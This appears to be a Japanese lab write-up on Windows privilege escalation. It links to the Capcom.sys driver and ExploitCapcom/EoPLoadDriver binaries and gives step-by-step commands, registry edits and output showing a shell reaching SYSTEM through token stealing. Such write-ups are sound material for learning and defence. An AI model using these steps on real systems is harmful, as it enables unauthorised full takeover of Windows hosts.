# エクスプロイトとドライバファイル（コンパイル不要）

- [Capcom.sys (mega.nz)](https://mega.nz/file/GiBTmCRD#cRz3XWMEojDvrd0LHPE3GpXKkYdikITvco8qKwmdgzQ)
- [ExploitCapcom.exe (github - clubby789)](https://github.com/clubby789/ExploitCapcom/releases/tag/1.0)

（sysファイルはドライバファイルの一つ。接続されたデバイスを制御するためのデータが含まれてる。）

<br>

**SeLoadDriverPrivilege**という権限があるからドライバのロードが出来る。

# 使い方

Exploit.Capcom.exeひとつでドライバのロードからコマンド実行まで可能。

```
*Evil-WinRM* PS C:\Users\svc-print> .\ExploitCapcom.exe LOAD C:\Users\svc-print\Capcom.sys
[*] Service Name: xmgrpdtl@õµó5
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\???????????????????
NTSTATUS: 00000000, WinError: 0

*Evil-WinRM* PS C:\Users\svc-print> .\ExploitCapcom.exe EXPLOIT whoami
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000064
[*] Shellcode was placed at 00000241542B0008
[+] Shellcode was executed
[+] Token stealing was successful
[+] Command Executed
nt authority\system
```

#  [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/)

これだけで
- SeLoadDriverPrivilegeの付与
- HKEY_CURRENT_USER下へのレジストリキーの作成
- NTLoadDriverの実行
まで行ってくれる。

```
EOPLOADDRIVER.exe RegistryServicePath DriverImagePath
```

新しくCapcom用にロードするならたとえば
```
.\EOPLOADDRIVER.exe System\CurrentControlSet\MyCapcom C:\Windows\svc-print\Downloads\Capcom.sys
```

<br>

ちなみに、ドライバのロードにはドライバサービス名をレジストリに登録する必要がある。

たとえば今回なら

```
*Evil-WinRM* PS C:\Users\svc-print> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Users\svc-print\Capcom.sys"
The operation completed successfully.

*Evil-WinRM* PS C:\Users\svc-print> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type  /t REG_DWORD /d 1
The operation completed successfully.
```

このboxではすでにSeLoadDriverPrivilegeの権限があったが、そうでない場合はこのレジストリの設定を行ったあとにEnableSeLoadDriverPrivilege.exe
とかをつかって権限を付与してやる。

# 結局何をしてるのか？（Comcomのドライバってなに？）

Capcom.sysはドライバファイル、そしてこのドライバはユーザ空間で定義された関数を使ってカーネル空間でコード実行できる機能がある。

それで、CapcomというドライバにおいてLPE（Local Privilege Escalation）の脆弱性及びエクスプロイトが公開されてる

つまりSeLoadDriverPrivilegeの権限があれば、この脆弱なCapcomというドライバをロードできて、それに対するエクスプロイトを使えるということ。

